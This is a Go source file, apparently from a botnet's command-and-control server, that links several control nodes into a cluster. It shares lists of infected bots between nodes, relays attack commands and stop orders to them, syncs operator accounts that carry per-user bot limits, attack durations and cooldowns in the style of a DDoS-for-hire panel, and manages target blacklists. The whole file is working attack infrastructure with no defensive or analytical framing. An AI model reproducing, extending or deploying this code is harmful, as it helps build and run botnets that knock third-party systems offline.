package main

import (
	"encoding/binary"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net"
	"sync"
	"sync/atomic"
	"time"
)

const (
	PeerMagic    = 0x464D
	PeerProtoVer = 1

	PeerMsgHello      byte = 0x01
	PeerMsgHelloOk    byte = 0x02
	PeerMsgHeartbeat  byte = 0x03
	PeerMsgBotJoin    byte = 0x04
	PeerMsgBotLeave   byte = 0x05
	PeerMsgAttack     byte = 0x06
	PeerMsgSyncReq    byte = 0x07
	PeerMsgSyncResp   byte = 0x08
	PeerMsgPeerStatus byte = 0x09
	PeerMsgUserAdd    byte = 0x0A
	PeerMsgUserDel    byte = 0x0B
	PeerMsgUserSync   byte = 0x0C
	PeerMsgAttackStop byte = 0x0D
	PeerMsgWhitelist  byte = 0x0E
)

type PeerHello struct {
	ID     int    `json:"id"`
	Secret string `json:"secret"`
}

type PeerBotJoin struct {
	UID      int      `json:"uid"`
	Source   string   `json:"source"`
	Addr     string   `json:"addr"`
	Version  string   `json:"version"`
	Modules  []string `json:"modules"`
	CapFlags string   `json:"caps"`
	RemoteID int      `json:"-"`
}

type PeerBotLeave struct {
	UID int `json:"uid"`
}

type PeerAttack struct {
	AttackData []byte `json:"attack_data"`
	MaxBots    int    `json:"max_bots"`
	Source     string `json:"source"`
	BotCata    string `json:"bot_cata"`
}

type PeerBotInfo struct {
	UID      int      `json:"uid"`
	Source   string   `json:"source"`
	Addr     string   `json:"addr"`
	Version  string   `json:"version"`
	Modules  []string `json:"modules"`
	CapFlags string   `json:"caps"`
}

type PeerSyncResp struct {
	Bots []PeerBotInfo `json:"bots"`
}

type PeerStatus struct {
	ID    int
	Up    bool
	Bots  int
	Proto int
	Addr  string
}

type Peer struct {
	ID     int
	Addr   string
	conn   net.Conn
	sendCh chan []byte
	alive  int32
	mu     sync.Mutex
	pm     *PeerManager
}

type PeerUserAdd struct {
	Username string `json:"u"`
	Password string `json:"p"`
	MaxBots  int    `json:"m"`
	Duration int    `json:"d"`
	Cooldown int    `json:"c"`
	Admin    int    `json:"a"`
}

type PeerUserDel struct {
	Username string `json:"u"`
}

type PeerUserSync struct {
	Users []PeerUserAdd `json:"users"`
	Deletes []string `json:"deletes"`
}

type PeerManager struct {
	localID     int
	secret      string
	port        string
	mu          sync.Mutex
	peers       map[int]*Peer
	peersList   []string
	onBotJoin   func(*PeerBotJoin)
	onBotLeave  func(int, int)
	onAttack    func(*PeerAttack)
	onUserAdd   func(*PeerUserAdd)
	onUserDel   func(string)
	listener    net.Listener
}

func NewPeerManager(localID int, secret string, port string, peerAddrs []string) *PeerManager {
	return &PeerManager{
		localID:   localID,
		secret:    secret,
		port:      port,
		peers:     make(map[int]*Peer),
		peersList: peerAddrs,
	}
}

func (pm *PeerManager) OnBotJoin(fn func(*PeerBotJoin))  { pm.onBotJoin = fn }
func (pm *PeerManager) OnBotLeave(fn func(int, int))     { pm.onBotLeave = fn }
func (pm *PeerManager) OnAttack(fn func(*PeerAttack))    { pm.onAttack = fn }
func (pm *PeerManager) OnUserAdd(fn func(*PeerUserAdd))  { pm.onUserAdd = fn }
func (pm *PeerManager) OnUserDel(fn func(string))        { pm.onUserDel = fn }

func (pm *PeerManager) Start() error {
	ln, err := net.Listen("tcp", pm.port)
	if err != nil {
		return fmt.Errorf("peer listen: %w", err)
	}
	pm.listener = ln
	go pm.acceptLoop()
	go pm.connectToPeers()
	go pm.heartbeatLoop()
	log.Printf("[peer] listening on %s (id=%d, peers=%d)", pm.port, pm.localID, len(pm.peersList))
	return nil
}

func (pm *PeerManager) acceptLoop() {
	for {
		conn, err := pm.listener.Accept()
		if err != nil {
			continue
		}
		go pm.handleIncoming(conn)
	}
}

func (pm *PeerManager) handleIncoming(conn net.Conn) {
	conn.SetDeadline(time.Now().Add(10 * time.Second))

	msgType, payload, err := pm.readFrame(conn)
	if err != nil || msgType != PeerMsgHello {
		conn.Close()
		return
	}

	var hello PeerHello
	if err := json.Unmarshal(payload, &hello); err != nil {
		conn.Close()
		return
	}

	if hello.Secret != pm.secret {
		log.Printf("[peer] auth failed from %s", conn.RemoteAddr())
		conn.Close()
		return
	}

	// send HELLO_OK
	resp := PeerHello{ID: pm.localID}
	if err := pm.sendFrame(conn, PeerMsgHelloOk, resp); err != nil {
		conn.Close()
		return
	}

	conn.SetDeadline(time.Time{})
	log.Printf("[peer] incoming from id=%d (%s)", hello.ID, conn.RemoteAddr())

	peer := &Peer{
		ID:     hello.ID,
		Addr:   conn.RemoteAddr().String(),
		conn:   conn,
		sendCh: make(chan []byte, 256),
		alive:  1,
		pm:     pm,
	}

	pm.mu.Lock()
	if old, ok := pm.peers[peer.ID]; ok {
		old.conn.Close()
		atomic.StoreInt32(&old.alive, 0)
		delete(pm.peers, peer.ID)
	}
	pm.peers[peer.ID] = peer
	pm.mu.Unlock()

	pm.sendSyncToPeer(peer)

	go pm.peerWriteLoop(peer)
	pm.peerReadLoop(peer)
}

func (pm *PeerManager) connectToPeers() {
	for _, addr := range pm.peersList {
		go pm.connectToPeer(addr)
		time.Sleep(200 * time.Millisecond)
	}
}

func (pm *PeerManager) connectToPeer(addr string) {
	backoff := 5
	maxBackoff := 300
	for {
		conn, err := net.DialTimeout("tcp", addr, 5*time.Second)
		if err != nil {
			if debugMode {
				log.Printf("[peer] dial %s: %v (retry in %ds)", addr, err, backoff)
			}
			time.Sleep(time.Duration(backoff) * time.Second)
			if backoff < maxBackoff {
				backoff *= 2
			}
			continue
		}

		conn.SetDeadline(time.Now().Add(10 * time.Second))

		hello := PeerHello{ID: pm.localID, Secret: pm.secret}
		if err := pm.sendFrame(conn, PeerMsgHello, hello); err != nil {
			conn.Close()
			time.Sleep(10 * time.Second)
			continue
		}

		msgType, payload, err := pm.readFrame(conn)
		if err != nil || msgType != PeerMsgHelloOk {
			conn.Close()
			time.Sleep(10 * time.Second)
			continue
		}
		var okResp PeerHello
		if err := json.Unmarshal(payload, &okResp); err != nil {
			conn.Close()
			continue
		}

		conn.SetDeadline(time.Time{})
		log.Printf("[peer] connected to %s (remote_id=%d)", addr, okResp.ID)

		peer := &Peer{
			ID:     okResp.ID,
			Addr:   addr,
			conn:   conn,
			sendCh: make(chan []byte, 256),
		alive:  1,
			pm:     pm,
		}

		pm.mu.Lock()
		if old, ok := pm.peers[peer.ID]; ok {
			old.conn.Close()
			atomic.StoreInt32(&old.alive, 0)
			delete(pm.peers, peer.ID)
		}
		pm.peers[peer.ID] = peer
		pm.mu.Unlock()

		pm.sendSyncToPeer(peer)

		go pm.peerWriteLoop(peer)
		pm.peerReadLoop(peer)
		return
	}
}

func (pm *PeerManager) peerWriteLoop(peer *Peer) {
	for {
		data, ok := <-peer.sendCh
		if !ok {
			return
		}
		peer.mu.Lock()
		peer.conn.SetWriteDeadline(time.Now().Add(5 * time.Second))
		_, err := peer.conn.Write(data)
		peer.mu.Unlock()
		if err != nil {
			atomic.StoreInt32(&peer.alive, 0)
			if debugMode {
				log.Printf("[peer] write to %s: %v", peer.Addr, err)
			}
			return
		}
	}
}

func (pm *PeerManager) peerReadLoop(peer *Peer) {
	defer func() {
		atomic.StoreInt32(&peer.alive, 0)
		pm.mu.Lock()
		delete(pm.peers, peer.ID)
		pm.mu.Unlock()
		close(peer.sendCh)
		peer.conn.Close()
		log.Printf("[peer] disconnected from id=%d", peer.ID)
	}()

	for {
		peer.conn.SetReadDeadline(time.Now().Add(60 * time.Second))
		msgType, payload, err := pm.readFrame(peer.conn)
		if err != nil {
			if err != io.EOF {
				log.Printf("[peer] read from id=%d: %v", peer.ID, err)
			}
			return
		}

		switch msgType {
		case PeerMsgHeartbeat:
			atomic.StoreInt32(&peer.alive, 1)

		case PeerMsgBotJoin:
			var join PeerBotJoin
			if err := json.Unmarshal(payload, &join); err == nil {
				join.RemoteID = peer.ID
				if pm.onBotJoin != nil {
					pm.onBotJoin(&join)
				}
			}

		case PeerMsgBotLeave:
			var leave PeerBotLeave
			if err := json.Unmarshal(payload, &leave); err == nil {
				if pm.onBotLeave != nil {
					pm.onBotLeave(leave.UID, peer.ID)
				}
			}

		case PeerMsgAttack:
			var atk PeerAttack
			if err := json.Unmarshal(payload, &atk); err == nil {
				if pm.onAttack != nil {
					pm.onAttack(&atk)
				}
			}

		case PeerMsgSyncResp:
			var syncResp PeerSyncResp
			if err := json.Unmarshal(payload, &syncResp); err == nil {
				for _, b := range syncResp.Bots {
					if pm.onBotJoin != nil {
						join := &PeerBotJoin{
							UID:      b.UID,
							Source:   b.Source,
							Addr:     b.Addr,
							Version:  b.Version,
							Modules:  b.Modules,
							CapFlags: b.CapFlags,
							RemoteID: peer.ID,
						}
						pm.onBotJoin(join)
					}
				}
			}

		case PeerMsgUserAdd:
			var ua PeerUserAdd
			if err := json.Unmarshal(payload, &ua); err == nil {
				if pm.onUserAdd != nil {
					pm.onUserAdd(&ua)
				}
			}

		case PeerMsgUserDel:
			var ud PeerUserDel
			if err := json.Unmarshal(payload, &ud); err == nil {
				if pm.onUserDel != nil {
					pm.onUserDel(ud.Username)
				}
			}

		case PeerMsgAttackStop:
			// received STOP from peer — stop attacks on our bots
			clientList.QueueBuf(BuildAttackStop(), -1, "")
			trackAttackStop()
			log.Printf("[peer] received STOP from id=%d", peer.ID)

		case PeerMsgWhitelist:
			var wl struct {
				Action      string `json:"a"`
				Prefix      string `json:"p"`
				IsBlacklist bool   `json:"b"`
			}
			if err := json.Unmarshal(payload, &wl); err == nil && database != nil {
				database.ManageBlacklist(wl.Action, wl.Prefix, wl.IsBlacklist)
			}

		case PeerMsgSyncReq:
			pm.sendSyncToPeer(peer)
		}
	}
}

func (pm *PeerManager) heartbeatLoop() {
	ticker := time.NewTicker(30 * time.Second)
	defer ticker.Stop()
	for range ticker.C {
		pm.mu.Lock()
		for id, peer := range pm.peers {
			if atomic.LoadInt32(&peer.alive) == 1 {
				atomic.StoreInt32(&peer.alive, 0)
				data := pm.buildFrame(PeerMsgHeartbeat, nil)
				select {
				case peer.sendCh <- data:
				default:
				}
			} else {
				log.Printf("[peer] heartbeat timeout, reconnecting id=%d", id)
				go pm.reconnectPeer(peer)
			}
		}
		pm.mu.Unlock()
	}
}

func (pm *PeerManager) reconnectPeer(peer *Peer) {
	peer.mu.Lock()
	peer.conn.Close()
	peer.mu.Unlock()

	pm.mu.Lock()
	delete(pm.peers, peer.ID)
	pm.mu.Unlock()

	go pm.connectToPeer(peer.Addr)
}

func (pm *PeerManager) BroadcastBotJoin(bot *Bot) {
	if bot.remoteID != 0 {
		return
	}
	join := PeerBotJoin{
		UID:     bot.uid,
		Source:  bot.source,
		Addr:    bot.conn.RemoteAddr().String(),
		Version: bot.versionStr,
		Modules: bot.modules,
		CapFlags: bot.capFlags,
	}
	data := pm.buildFrame(PeerMsgBotJoin, join)
	pm.broadcast(data)
}

func (pm *PeerManager) BroadcastBotLeave(bot *Bot) {
	if bot.remoteID != 0 {
		return
	}
	leave := PeerBotLeave{UID: bot.uid}
	data := pm.buildFrame(PeerMsgBotLeave, leave)
	pm.broadcast(data)
}

func (pm *PeerManager) BroadcastAttack(attackData []byte, maxBots int, botCata string) {
	atk := PeerAttack{
		AttackData: attackData,
		MaxBots:    maxBots,
		Source:     fmt.Sprintf("admin@node%d", pm.localID),
		BotCata:    botCata,
	}
	data := pm.buildFrame(PeerMsgAttack, atk)
	pm.broadcast(data)
}

func (pm *PeerManager) BroadcastUserAdd(username, password string, maxBots, duration, cooldown, isAdmin int) {
	ua := PeerUserAdd{
		Username: username,
		Password: password,
		MaxBots:  maxBots,
		Duration: duration,
		Cooldown: cooldown,
		Admin:    isAdmin,
	}
	data := pm.buildFrame(PeerMsgUserAdd, ua)
	pm.broadcast(data)
}

func (pm *PeerManager) BroadcastUserDel(username string) {
	ud := PeerUserDel{Username: username}
	data := pm.buildFrame(PeerMsgUserDel, ud)
	pm.broadcast(data)
}

func (pm *PeerManager) BroadcastAttackStop() {
	data := pm.buildFrame(PeerMsgAttackStop, nil)
	pm.broadcast(data)
}

func (pm *PeerManager) BroadcastWhitelist(action, prefix string, isBlacklist bool) {
	wl := struct {
		Action      string `json:"a"`
		Prefix      string `json:"p"`
		IsBlacklist bool   `json:"b"`
	}{action, prefix, isBlacklist}
	data := pm.buildFrame(PeerMsgWhitelist, wl)
	pm.broadcast(data)
}

func (pm *PeerManager) sendSyncToPeer(peer *Peer) {
	var bots []PeerBotInfo
	clientList.ForEachClient(func(bot *Bot) {
		bots = append(bots, PeerBotInfo{
			UID:      bot.uid,
			Source:   bot.source,
			Addr: func() string {
				if bot.conn != nil {
					return bot.conn.RemoteAddr().String()
				}
				return ""
			}(),
			Version:  bot.versionStr,
			Modules:  bot.modules,
			CapFlags: bot.capFlags,
		})
	})
	syncResp := PeerSyncResp{Bots: bots}
	data := pm.buildFrame(PeerMsgSyncResp, syncResp)
	select {
	case peer.sendCh <- data:
	default:
	}
}

func (pm *PeerManager) broadcast(data []byte) {
	pm.mu.Lock()
	defer pm.mu.Unlock()
	for _, peer := range pm.peers {
		if atomic.LoadInt32(&peer.alive) == 1 {
			select {
			case peer.sendCh <- data:
			default:
			}
		}
	}
}

func (pm *PeerManager) PeerCount() int {
	pm.mu.Lock()
	defer pm.mu.Unlock()
	n := 0
	for _, p := range pm.peers {
		if atomic.LoadInt32(&p.alive) == 1 {
			n++
		}
	}
	return n
}

func (pm *PeerManager) PeerStatuses() []PeerStatus {
	pm.mu.Lock()
	defer pm.mu.Unlock()
	var statuses []PeerStatus
	for _, p := range pm.peers {
		statuses = append(statuses, PeerStatus{
			ID:   p.ID,
			Up:   atomic.LoadInt32(&p.alive) == 1,
			Addr: p.Addr,
		})
	}
	return statuses
}

func (pm *PeerManager) buildFrame(msgType byte, payload interface{}) []byte {
	var payloadBytes []byte
	if payload != nil {
		payloadBytes, _ = json.Marshal(payload)
	}
	frame := make([]byte, 7+len(payloadBytes))
	binary.BigEndian.PutUint16(frame[0:2], PeerMagic)
	frame[2] = msgType
	binary.BigEndian.PutUint32(frame[3:7], uint32(len(payloadBytes)))
	copy(frame[7:], payloadBytes)
	return frame
}

func (pm *PeerManager) sendFrame(conn net.Conn, msgType byte, payload interface{}) error {
	frame := pm.buildFrame(msgType, payload)
	conn.SetWriteDeadline(time.Now().Add(5 * time.Second))
	_, err := conn.Write(frame)
	return err
}

func (pm *PeerManager) readFrame(conn net.Conn) (byte, []byte, error) {
	header := make([]byte, 7)
	if _, err := io.ReadFull(conn, header); err != nil {
		return 0, nil, err
	}
	magic := binary.BigEndian.Uint16(header[0:2])
	if magic != PeerMagic {
		return 0, nil, fmt.Errorf("bad magic 0x%04x", magic)
	}
	msgType := header[2]
	payloadLen := binary.BigEndian.Uint32(header[3:7])
	if payloadLen > 65536 {
		return 0, nil, fmt.Errorf("payload too large: %d", payloadLen)
	}
	if payloadLen == 0 {
		return msgType, nil, nil
	}
	payload := make([]byte, payloadLen)
	if _, err := io.ReadFull(conn, payload); err != nil {
		return 0, nil, err
	}
	return msgType, payload, nil
}

func (pm *PeerManager) SendSyncRequest(addr string) {
	conn, err := net.DialTimeout("tcp", addr, 5*time.Second)
	if err != nil {
		return
	}
	defer conn.Close()
	pm.sendFrame(conn, PeerMsgSyncReq, nil)
}
